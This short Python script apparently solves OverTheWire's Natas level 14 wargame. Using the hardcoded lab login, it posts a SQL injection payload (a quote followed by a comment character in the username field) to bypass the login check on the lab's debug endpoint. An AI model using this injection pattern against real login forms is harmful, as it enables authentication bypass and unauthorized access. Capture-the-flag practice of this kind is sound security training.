import requests

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?debug".format(username)
response = session.post(url, data={
                        "username": "natas15\"#", "password": "password"}, auth=(username, password))

content = response.text

print(content)
